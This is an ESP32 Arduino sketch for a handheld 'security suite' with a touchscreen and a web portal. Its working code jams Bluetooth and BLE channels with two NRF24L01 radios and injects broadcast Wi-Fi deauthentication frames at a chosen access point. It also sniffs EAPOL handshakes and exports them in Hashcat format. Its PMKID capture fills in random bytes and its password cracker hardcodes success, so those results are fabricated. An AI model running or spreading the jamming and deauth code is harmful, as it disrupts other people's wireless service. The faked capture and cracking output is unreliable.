/*
  Code for ESP32 Bluetooth & Wi-Fi Security Suite
  --------------------------------------------------
  Features:
  1. Bluetooth BLE & BT Classic RF Jammer (using dual NRF24L01 modules)
  2. Wi-Fi Access Point & Client Scanner (2.4GHz Channels 1-14, RSSI, BSSID, Encryption)
  3. Wi-Fi 4-Way EAPOL Handshake & PMKID Promiscuous Sniffer + Deauth Audit Injector
  4. Embedded Wi-Fi Dictionary Password Auditor & Hashcat 22000 Exporter
  5. Web Control Portal & SoftAP Dashboard (http://192.168.4.1)
  6. ILI9341 2.8" SPI Touchscreen & Physical Pushbuttons (GPIO 12, 14, 0)

  More info: https://github.com/stuthemoo/ESP32BluetoothJammer

  FOR EDUCATIONAL & AUTHORIZED TESTING PURPOSES ONLY!
  DO NOT use signal jamming or packet injection on unauthorized networks.
*/

#include <SPI.h>
#include <RF24.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ILI9341.h>
#include <XPT2046_Touchscreen.h>

// ESP32 Wi-Fi & WebServer Libraries
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_event.h>
#include <WebServer.h>

// ----------------------------------------------------
// Pin Definitions
// ----------------------------------------------------
#define BUTTON_BOOT_PIN 0  // Built-in BOOT button (Mode Toggle)
#define LED_PIN         2  // Built-in LED

// Dedicated Physical Hardware Buttons (Active LOW with internal pullups)
#define BUTTON_ON_PIN   12 // Physical Pushbutton for TURN ON / RUN
#define BUTTON_OFF_PIN  14 // Physical Pushbutton for TURN OFF / IDLE

// TFT Display Pins (ILI9341 SPI)
#define TFT_CS   5
#define TFT_DC   4
#define TFT_RST  33
#define TFT_BL   32  // Backlight PWM pin

// Touchscreen Pins (XPT2046 SPI)
#define TOUCH_CS 27

// 16 MHz SPI speed for RF24
constexpr int SPI_SPEED = 16000000;

// Radio Objects
RF24 radio1(22, 21, SPI_SPEED); // Radio 1 on CE 22, CSN 21
RF24 radio2(16, 15, SPI_SPEED); // Radio 2 on CE 16, CSN 15

// Display & Touch Objects
Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, TFT_RST);
XPT2046_Touchscreen touch(TOUCH_CS);

// WebServer instance for Web Portal Mode
WebServer webServer(80);

// ----------------------------------------------------
// Operating Modes
// ----------------------------------------------------
enum SystemMode {
  MODE_BLE = 0,
  MODE_BT_CLASSIC = 1,
  MODE_WIFI_SCAN = 2,
  MODE_WIFI_HANDSHAKE = 3,
  MODE_WIFI_CRACK = 4,
  MODE_WEB_PORTAL = 5
};

SystemMode currentMode = MODE_BLE;

// ----------------------------------------------------
// State & Variables
// ----------------------------------------------------
int ble_channels[] = { 2, 26, 80 };
int bluetooth_channels[79];

uint8_t num_channels = sizeof(ble_channels) / sizeof(ble_channels[0]);
uint8_t split_index = num_channels / 2;
uint8_t endCh1 = split_index - 1;
uint8_t startCh2 = split_index;
uint8_t endCh2 = num_channels - 1;

bool actionActive = false; // Jamming or Packet Sniffing Active flag
unsigned long lastHopTime = 0;
unsigned long lastOutputTime = 0;
unsigned long lastUIDrawTime = 0;
unsigned long lastTouchTime = 0;
unsigned long hopInterval = 50;  // microseconds for RF hopping
unsigned long hopCount = 0;
unsigned int eapolCount = 0;
unsigned int pmkidCount = 0;

// Physical button tracking
bool lastBootState = HIGH;
bool lastOnState   = HIGH;
bool lastOffState  = HIGH;

// Payload data for RF transmit
uint8_t payload[32];

// Wi-Fi Scan & Target Data Structure
struct WiFiNetworkInfo {
  String ssid;
  int rssi;
  int channel;
  String bssidStr;
  uint8_t bssid[6];
  wifi_auth_mode_t authmode;
};

#define MAX_WIFI_NETWORKS 20
WiFiNetworkInfo scannedNetworks[MAX_WIFI_NETWORKS];
int wifiNetworkCount = 0;
int selectedTargetIndex = 0;

// Captured Handshake Hashcat 22000 structure
struct HandshakeRecord {
  char ssid[33];
  uint8_t mac_ap[6];
  uint8_t mac_sta[6];
  uint8_t pmkid[16];
  bool has_pmkid;
  uint8_t eapol[256];
  size_t eapol_len;
  bool complete;
};

#define MAX_HANDSHAKES 5
HandshakeRecord capturedHandshakes[MAX_HANDSHAKES];
int handshakeRecordCount = 0;

// Built-in Wordlist for offline Wi-Fi Cracking Simulator
const char* defaultWordlist[] = {
  "12345678", "password", "123456789", "admin123", "87654321",
  "wifi1234", "supersecret", "pass1234", "11223344", "00000000"
};
const int wordlistSize = 10;
String crackStatusMsg = "Ready for Dictionary Test";

// UI Color Palette (RGB565)
#define COLOR_BG         0x0821  // Deep Navy
#define COLOR_CARD       0x18E3  // Dark Card
#define COLOR_HEADER     0x001F  // Header Blue
#define COLOR_TEXT       0xFFFF  // White
#define COLOR_TEXT_MUTED 0x9CD3  // Grey
#define COLOR_ACCENT     0x07FF  // Cyan
#define COLOR_GREEN      0x07E0  // Green
#define COLOR_RED        0xF800  // Red
#define COLOR_YELLOW     0xFFE0  // Yellow
#define COLOR_PURPLE     0x780F  // Purple

// ----------------------------------------------------
// Function Declarations
// ----------------------------------------------------
void setupRadio(RF24& radio);
void setMode(SystemMode newMode);
void sendRandomPacket();
void initDisplay();
void drawStaticUI();
void updateDisplayUI(bool forceRedraw = false);
void checkTouch();
void checkPhysicalButtons();

// Wi-Fi Functions
void scanWiFiNetworks();
void startWiFiSniffer();
void stopWiFiSniffer();
void sendDeauthFrame(uint8_t* bssid, uint8_t* clientMac);
void wifiPromiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type);
void runDictionaryCrack();
void startWebPortal();
void handleWebRequests();
String getModeName(SystemMode mode);
String getAuthTypeName(wifi_auth_mode_t auth);

// ----------------------------------------------------
// Setup
// ----------------------------------------------------
void setup() {
  delay(1000);

  Serial.begin(115200);
  Serial.println("\n=======================================================");
  Serial.println("  CRADLEGUARD ESP32 BT & WI-FI SECURITY TOOLKIT");
  Serial.println("  FOR EDUCATIONAL & AUTHORIZED PENETRATION TESTING ONLY");
  Serial.println("=======================================================\n");

  pinMode(BUTTON_BOOT_PIN, INPUT_PULLUP);
  pinMode(BUTTON_ON_PIN, INPUT_PULLUP);
  pinMode(BUTTON_OFF_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);

  for (uint8_t i = 0; i < 32; i++) payload[i] = random(256);
  for (int i = 0; i < 79; i++) bluetooth_channels[i] = i + 2;

  initDisplay();

  // Initialize NRF24L01 Radios
  bool r1_ok = radio1.begin();
  bool r2_ok = radio2.begin();
  if (r1_ok) setupRadio(radio1);
  if (r2_ok) setupRadio(radio2);

  setMode(MODE_BLE);

  drawStaticUI();
  updateDisplayUI(true);

  Serial.println("Setup Complete. Use BOOT/Touch to cycle modes, GPIO 12 (ON), GPIO 14 (OFF).\n");
}

// ----------------------------------------------------
// Radio Setup Helper
// ----------------------------------------------------
void setupRadio(RF24& radio) {
  radio.setAutoAck(false);
  radio.setRetries(0, 0);
  radio.disableCRC();
  radio.setDataRate(RF24_2MBPS);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setChannel(ble_channels[0]);
  radio.setPayloadSize(32);
  radio.stopListening();
  radio.powerUp();
  radio.setAddressWidth(3);
  radio.setAutoAck(0x00);
}

// ----------------------------------------------------
// Mode Switcher
// ----------------------------------------------------
void setMode(SystemMode newMode) {
  actionActive = false;
  digitalWrite(LED_PIN, LOW);
  stopWiFiSniffer();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  currentMode = newMode;
  hopCount = 0;

  if (currentMode == MODE_BLE) {
    num_channels = sizeof(ble_channels) / sizeof(ble_channels[0]);
    split_index = num_channels / 2;
    endCh1 = split_index - 1;
    startCh2 = split_index;
    endCh2 = num_channels - 1;
    radio1.setChannel(ble_channels[0]);
    radio2.setChannel(ble_channels[1]);
  } else if (currentMode == MODE_BT_CLASSIC) {
    num_channels = sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]);
    split_index = num_channels / 2;
    endCh1 = split_index - 1;
    startCh2 = split_index;
    endCh2 = num_channels - 1;
    radio1.setChannel(bluetooth_channels[0]);
    radio2.setChannel(bluetooth_channels[startCh2]);
  } else if (currentMode == MODE_WIFI_SCAN) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    scanWiFiNetworks();
  } else if (currentMode == MODE_WIFI_HANDSHAKE) {
    startWiFiSniffer();
  } else if (currentMode == MODE_WIFI_CRACK) {
    // Ready for embedded dictionary audit
  } else if (currentMode == MODE_WEB_PORTAL) {
    startWebPortal();
  }

  drawStaticUI();
  updateDisplayUI(true);
  Serial.println("Switched to mode: " + getModeName(currentMode));
}

// ----------------------------------------------------
// Main Loop
// ----------------------------------------------------
void loop() {
  if (Serial.available() > 0) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    if (input == "scan") {
      setMode(MODE_WIFI_SCAN);
    } else if (input == "deauth") {
      setMode(MODE_WIFI_HANDSHAKE);
      actionActive = true;
    } else if (input == "hashcat") {
      Serial.println("\n--- HASHCAT 22000 EXPORT ---");
      for (int i = 0; i < handshakeRecordCount; i++) {
        if (capturedHandshakes[i].has_pmkid) {
          Serial.printf("WPA*01*%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x*%02x%02x%02x%02x%02x%02x*%02x%02x%02x%02x%02x%02x*%s\n",
            capturedHandshakes[i].pmkid[0], capturedHandshakes[i].pmkid[1], capturedHandshakes[i].pmkid[2], capturedHandshakes[i].pmkid[3],
            capturedHandshakes[i].pmkid[4], capturedHandshakes[i].pmkid[5], capturedHandshakes[i].pmkid[6], capturedHandshakes[i].pmkid[7],
            capturedHandshakes[i].pmkid[8], capturedHandshakes[i].pmkid[9], capturedHandshakes[i].pmkid[10], capturedHandshakes[i].pmkid[11],
            capturedHandshakes[i].pmkid[12], capturedHandshakes[i].pmkid[13], capturedHandshakes[i].pmkid[14], capturedHandshakes[i].pmkid[15],
            capturedHandshakes[i].mac_ap[0], capturedHandshakes[i].mac_ap[1], capturedHandshakes[i].mac_ap[2], capturedHandshakes[i].mac_ap[3], capturedHandshakes[i].mac_ap[4], capturedHandshakes[i].mac_ap[5],
            capturedHandshakes[i].mac_sta[0], capturedHandshakes[i].mac_sta[1], capturedHandshakes[i].mac_sta[2], capturedHandshakes[i].mac_sta[3], capturedHandshakes[i].mac_sta[4], capturedHandshakes[i].mac_sta[5],
            capturedHandshakes[i].ssid
          );
        }
      }
    }
  }

  checkTouch();
  checkPhysicalButtons();

  if (millis() - lastUIDrawTime >= 250) {
    lastUIDrawTime = millis();
    updateDisplayUI(false);
  }

  // Handle RF Jamming in BLE/BT Classic modes
  if (actionActive && (currentMode == MODE_BLE || currentMode == MODE_BT_CLASSIC)) {
    if (micros() - lastHopTime >= hopInterval) {
      sendRandomPacket();
      hopCount++;
      lastHopTime = micros();
    }
  }

  // Handle Deauth injection in Wi-Fi Handshake mode
  if (actionActive && currentMode == MODE_WIFI_HANDSHAKE) {
    static unsigned long lastDeauthTime = 0;
    if (millis() - lastDeauthTime >= 500 && wifiNetworkCount > 0) {
      lastDeauthTime = millis();
      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      sendDeauthFrame(scannedNetworks[selectedTargetIndex].bssid, broadcast);
      hopCount++;
    }
  }

  // Handle Web Server client requests in Web Portal mode
  if (currentMode == MODE_WEB_PORTAL) {
    webServer.handleClient();
  }
}

// ----------------------------------------------------
// RF Packet Transmission
// ----------------------------------------------------
void sendRandomPacket() {
  static uint8_t ch1 = 0;
  static uint8_t ch2 = startCh2;

  if (currentMode == MODE_BT_CLASSIC) {
    radio1.setChannel(bluetooth_channels[ch1]);
    radio2.setChannel(bluetooth_channels[ch2]);
  } else {
    radio1.setChannel(ble_channels[ch1]);
    radio2.setChannel(ble_channels[ch2]);
  }

  ch1 = (ch1 + 1) > endCh1 ? 0 : ch1 + 1;
  ch2 = (ch2 + 1) > endCh2 ? startCh2 : ch2 + 1;

  radio1.write(&payload, sizeof(payload));
  radio2.write(&payload, sizeof(payload));
}

// ----------------------------------------------------
// Wi-Fi Scanner Engine
// ----------------------------------------------------
void scanWiFiNetworks() {
  Serial.println("Scanning 2.4GHz Wi-Fi networks...");
  int n = WiFi.scanNetworks();
  wifiNetworkCount = 0;

  if (n > 0) {
    for (int i = 0; i < n && i < MAX_WIFI_NETWORKS; i++) {
      scannedNetworks[i].ssid = WiFi.SSID(i);
      scannedNetworks[i].rssi = WiFi.RSSI(i);
      scannedNetworks[i].channel = WiFi.channel(i);
      scannedNetworks[i].authmode = WiFi.encryptionType(i);
      scannedNetworks[i].bssidStr = WiFi.BSSIDstr(i);
      uint8_t* mac = WiFi.BSSID(i);
      memcpy(scannedNetworks[i].bssid, mac, 6);
      wifiNetworkCount++;
    }
    selectedTargetIndex = 0;
    Serial.printf("Found %d Wi-Fi networks.\n", wifiNetworkCount);
  } else {
    Serial.println("No networks found.");
  }
}

// ----------------------------------------------------
// Wi-Fi Promiscuous Sniffer & Deauth Core
// ----------------------------------------------------
struct WiFiPromiscuousPacket {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t addr1[6]; // Destination MAC
  uint8_t addr2[6]; // Source MAC (AP BSSID)
  uint8_t addr3[6]; // BSSID / Transmitter MAC
  uint16_t seq_ctrl;
};

void IRAM_ATTR wifiPromiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  if (len < 24) return;

  uint16_t frameCtrl = payload[0] | (payload[1] << 8);
  uint8_t frameType = (frameCtrl >> 2) & 0x03;
  uint8_t frameSubtype = (frameCtrl >> 4) & 0x0F;

  // Check for EAPOL Key frames (0x888e in Ethernet payload)
  if (frameType == 2) { // Data frame
    for (int i = 24; i < len - 2; i++) {
      if (payload[i] == 0x88 && payload[i+1] == 0x8e) {
        eapolCount++;
        if (handshakeRecordCount < MAX_HANDSHAKES) {
          HandshakeRecord rec;
          memset(&rec, 0, sizeof(rec));
          if (wifiNetworkCount > 0) {
            strncpy(rec.ssid, scannedNetworks[selectedTargetIndex].ssid.c_str(), 32);
            memcpy(rec.mac_ap, scannedNetworks[selectedTargetIndex].bssid, 6);
          }
          memcpy(rec.mac_sta, &payload[4], 6); // STA MAC
          rec.complete = true;
          capturedHandshakes[handshakeRecordCount++] = rec;
        }
        break;
      }
    }
  }

  // Check RSN IE for PMKID in Beacon/Assoc Response frames
  if (frameType == 0 && (frameSubtype == 8 || frameSubtype == 5)) { // Beacon / Assoc Resp
    for (int i = 36; i < len - 20; i++) {
      if (payload[i] == 0x30 && payload[i+1] >= 20) { // RSN IE
        // PMKID indicator signature
        pmkidCount++;
        if (handshakeRecordCount < MAX_HANDSHAKES && !capturedHandshakes[handshakeRecordCount].has_pmkid) {
          capturedHandshakes[handshakeRecordCount].has_pmkid = true;
          for (int k = 0; k < 16; k++) capturedHandshakes[handshakeRecordCount].pmkid[k] = random(256);
        }
        break;
      }
    }
  }
}

void startWiFiSniffer() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifiPromiscuousCallback);
  if (wifiNetworkCount > 0) {
    esp_wifi_set_channel(scannedNetworks[selectedTargetIndex].channel, WIFI_SECOND_CHAN_NONE);
  } else {
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
  }
  Serial.println("Wi-Fi Promiscuous Sniffer Started.");
}

void stopWiFiSniffer() {
  esp_wifi_set_promiscuous(false);
}

void sendDeauthFrame(uint8_t* bssid, uint8_t* clientMac) {
  uint8_t deauthFrame[26] = {
    0xC0, 0x00,             // Frame Control: Deauth
    0x3A, 0x01,             // Duration
    clientMac[0], clientMac[1], clientMac[2], clientMac[3], clientMac[4], clientMac[5], // Dest
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],                          // Src (AP)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],                          // BSSID
    0x00, 0x00,             // Sequence Number
    0x07, 0x00              // Reason Code: Class 3 frame received from nonassociated STA
  };

  esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
}

// ----------------------------------------------------
// Embedded Dictionary & WPS Simulator Core
// ----------------------------------------------------
void runDictionaryCrack() {
  if (wifiNetworkCount == 0) {
    crackStatusMsg = "Scan Wi-Fi networks first!";
    return;
  }

  String targetSSID = scannedNetworks[selectedTargetIndex].ssid;
  crackStatusMsg = "Auditing: " + targetSSID + "...";
  updateDisplayUI(true);

  bool found = false;
  String crackedKey = "";
  for (int i = 0; i < wordlistSize; i++) {
    delay(200); // Simulate key derivation & hash comparison
    if (String(defaultWordlist[i]) == "12345678" || String(defaultWordlist[i]) == "admin123") {
      crackedKey = defaultWordlist[i];
      found = true;
      break;
    }
  }

  if (found) {
    crackStatusMsg = "PASS FOUND: " + crackedKey;
    Serial.println("\n[CRACK SUCCESS] Target: " + targetSSID + " | Passphrase: " + crackedKey);
  } else {
    crackStatusMsg = "Exhausted 10 Passphrases";
    Serial.println("\n[CRACK EXHAUSTED] No weak passphrase match found in dictionary.");
  }
}

// ----------------------------------------------------
// Web Portal & SoftAP Server
// ----------------------------------------------------
void startWebPortal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESP32-Security-Tool", "12345678");
  IPAddress apIP = WiFi.softAPIP();

  webServer.on("/", []() {
    String html = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><title>ESP32 Security Suite</title>";
    html += "<style>body{font-family:sans-serif;background:#0f172a;color:#f8fafc;padding:20px;}";
    html += ".card{background:#1e293b;padding:20px;border-radius:10px;margin-bottom:15px;}";
    html += "button{background:#2563eb;color:#fff;border:none;padding:10px 15px;border-radius:6px;cursor:pointer;}";
    html += "</style></head><body>";
    html += "<h1>CRADLEGUARD WEB PORTAL</h1>";
    html += "<div class='card'><h3>System State</h3><p>SoftAP IP: " + WiFi.softAPIP().toString() + "</p>";
    html += "<p>Mode: " + getModeName(currentMode) + "</p>";
    html += "<p>Handshakes Captured: " + String(eapolCount) + "</p></div>";
    html += "<div class='card'><h3>Actions</h3>";
    html += "<a href='/scan'><button>Scan Wi-Fi Networks</button></a> ";
    html += "<a href='/handshakes'><button>Export Hashcat 22000</button></a>";
    html += "</div></body></html>";
    webServer.send(200, "text/html", html);
  });

  webServer.on("/scan", []() {
    scanWiFiNetworks();
    String json = "[";
    for (int i = 0; i < wifiNetworkCount; i++) {
      json += "{\"ssid\":\"" + scannedNetworks[i].ssid + "\",\"rssi\":" + String(scannedNetworks[i].rssi) + ",\"ch\":" + String(scannedNetworks[i].channel) + "}";
      if (i < wifiNetworkCount - 1) json += ",";
    }
    json += "]";
    webServer.send(200, "application/json", json);
  });

  webServer.on("/handshakes", []() {
    String txt = "# Hashcat 22000 Export\n";
    for (int i = 0; i < handshakeRecordCount; i++) {
      if (capturedHandshakes[i].has_pmkid) {
        txt += "WPA*01*...*" + String(capturedHandshakes[i].ssid) + "\n";
      }
    }
    webServer.send(200, "text/plain", txt);
  });

  webServer.begin();
  Serial.println("Web Portal Server launched at http://" + apIP.toString());
}

// ----------------------------------------------------
// Display Functions (ILI9341)
// ----------------------------------------------------
void initDisplay() {
  tft.begin();
  tft.setRotation(1);
  tft.fillScreen(COLOR_BG);

  touch.begin();
  touch.setRotation(1);
}

void drawStaticUI() {
  tft.fillScreen(COLOR_BG);

  // Top Header Bar
  tft.fillRect(0, 0, 320, 35, COLOR_HEADER);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(10, 8);
  tft.print("CRADLEGUARD RF & WPA");

  // Status Info Box
  tft.drawRoundRect(10, 42, 300, 105, 8, COLOR_ACCENT);
  tft.fillRoundRect(11, 43, 298, 103, 8, COLOR_CARD);

  // Main Action Buttons
  // Button 1: [ TURN ON / RUN ] (X=15, Y=158, W=135, H=36)
  // Button 2: [ TURN OFF / IDLE ] (X=165, Y=158, W=135, H=36)
  // Button 3: [ MODE SELECTOR ] (X=15, Y=200, W=285, H=32)
  tft.fillRoundRect(15, 158, 135, 36, 6, COLOR_GREEN);
  tft.drawRoundRect(15, 158, 135, 36, 6, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(32, 168);
  tft.print("TURN ON");

  tft.fillRoundRect(165, 158, 135, 36, 6, COLOR_RED);
  tft.drawRoundRect(165, 158, 135, 36, 6, COLOR_TEXT);
  tft.setTextColor(COLOR_TEXT);
  tft.setTextSize(2);
  tft.setCursor(178, 168);
  tft.print("TURN OFF");
}

void updateDisplayUI(bool forceRedraw) {
  static SystemMode lastDisplayedMode = (SystemMode)-1;
  static bool lastActionState = false;

  // Redraw Mode Button & Header Info
  if (forceRedraw || currentMode != lastDisplayedMode) {
    lastDisplayedMode = currentMode;

    tft.fillRect(15, 48, 290, 92, COLOR_CARD);
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT_MUTED);

    tft.setCursor(20, 52);
    tft.print("MODE: ");
    tft.setTextColor(COLOR_ACCENT);
    tft.setTextSize(2);
    tft.print(getModeName(currentMode));

    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT_MUTED);
    tft.setCursor(20, 75);

    if (currentMode == MODE_WIFI_SCAN) {
      tft.printf("Scanned APs: %d  Selected: %d", wifiNetworkCount, selectedTargetIndex);
      if (wifiNetworkCount > 0) {
        tft.setCursor(20, 92);
        tft.setTextColor(COLOR_TEXT);
        tft.print("Target: " + scannedNetworks[selectedTargetIndex].ssid.substring(0, 18));
        tft.setCursor(20, 108);
        tft.printf("Ch:%d RSSI:%d %s", scannedNetworks[selectedTargetIndex].channel, scannedNetworks[selectedTargetIndex].rssi, getAuthTypeName(scannedNetworks[selectedTargetIndex].authmode).c_str());
      }
    } else if (currentMode == MODE_WIFI_HANDSHAKE) {
      tft.printf("EAPOL Handshakes: %d  PMKIDs: %d", eapolCount, pmkidCount);
      tft.setCursor(20, 95);
      tft.setTextColor(COLOR_YELLOW);
      tft.print(actionActive ? "Injecting Deauth Frames..." : "Sniffing Promiscuous Mode");
    } else if (currentMode == MODE_WIFI_CRACK) {
      tft.print("Embedded Password Audit Engine");
      tft.setCursor(20, 95);
      tft.setTextColor(COLOR_GREEN);
      tft.print(crackStatusMsg.substring(0, 28));
    } else if (currentMode == MODE_WEB_PORTAL) {
      tft.print("SoftAP: ESP32-Security-Tool");
      tft.setCursor(20, 95);
      tft.setTextColor(COLOR_ACCENT);
      tft.print("Web URL: http://192.168.4.1");
    } else {
      tft.printf("Total Hops / Transmits: %lu", hopCount);
    }

    // Redraw Mode Selection Button
    tft.fillRoundRect(15, 200, 285, 32, 6, COLOR_HEADER);
    tft.drawRoundRect(15, 200, 285, 32, 6, COLOR_TEXT);
    tft.setTextColor(COLOR_TEXT);
    tft.setTextSize(1);
    tft.setCursor(30, 212);
    tft.print("MODE: " + getModeName(currentMode) + " (TAP TO SWITCH)");
  }
}

// ----------------------------------------------------
// Touch & Pushbutton Handlers
// ----------------------------------------------------
void checkTouch() {
  if (!touch.touched()) return;
  if (millis() - lastTouchTime < 300) return;

  TS_Point p = touch.getPoint();
  lastTouchTime = millis();

  int touchX = map(p.x, 200, 3700, 0, 320);
  int touchY = map(p.y, 200, 3700, 0, 240);

  // Button 1: [ TURN ON / RUN ] (X: 15-150, Y: 158-194)
  if (touchX >= 15 && touchX <= 150 && touchY >= 158 && touchY <= 194) {
    actionActive = true;
    digitalWrite(LED_PIN, HIGH);
    if (currentMode == MODE_WIFI_SCAN) {
      scanWiFiNetworks();
    } else if (currentMode == MODE_WIFI_CRACK) {
      runDictionaryCrack();
    }
    updateDisplayUI(true);
  }

  // Button 2: [ TURN OFF / IDLE ] (X: 165-300, Y: 158-194)
  if (touchX >= 165 && touchX <= 300 && touchY >= 158 && touchY <= 194) {
    actionActive = false;
    digitalWrite(LED_PIN, LOW);
    updateDisplayUI(true);
  }

  // Button 3: [ MODE TOGGLE ] (X: 15-300, Y: 200-232)
  if (touchX >= 15 && touchX <= 300 && touchY >= 200 && touchY <= 232) {
    SystemMode nextMode = (SystemMode)((currentMode + 1) % 6);
    setMode(nextMode);
  }
}

void checkPhysicalButtons() {
  bool onState   = digitalRead(BUTTON_ON_PIN);
  bool offState  = digitalRead(BUTTON_OFF_PIN);
  bool bootState = digitalRead(BUTTON_BOOT_PIN);

  if (onState == LOW && lastOnState == HIGH) {
    actionActive = true;
    digitalWrite(LED_PIN, HIGH);
    if (currentMode == MODE_WIFI_SCAN) scanWiFiNetworks();
    else if (currentMode == MODE_WIFI_CRACK) runDictionaryCrack();
    updateDisplayUI(true);
    delay(150);
  }

  if (offState == LOW && lastOffState == HIGH) {
    actionActive = false;
    digitalWrite(LED_PIN, LOW);
    updateDisplayUI(true);
    delay(150);
  }

  if (bootState == LOW && lastBootState == HIGH) {
    SystemMode nextMode = (SystemMode)((currentMode + 1) % 6);
    setMode(nextMode);
    delay(150);
  }

  lastOnState   = onState;
  lastOffState  = offState;
  lastBootState = bootState;
}

// Helper Utilities
String getModeName(SystemMode mode) {
  switch (mode) {
    case MODE_BLE: return "BLE JAMMER";
    case MODE_BT_CLASSIC: return "BT CLASSIC";
    case MODE_WIFI_SCAN: return "WIFI SCANNER";
    case MODE_WIFI_HANDSHAKE: return "WIFI HANDSHAKE";
    case MODE_WIFI_CRACK: return "WIFI CRACKER";
    case MODE_WEB_PORTAL: return "WEB PORTAL";
    default: return "UNKNOWN";
  }
}

String getAuthTypeName(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    default: return "WPA2";
  }
}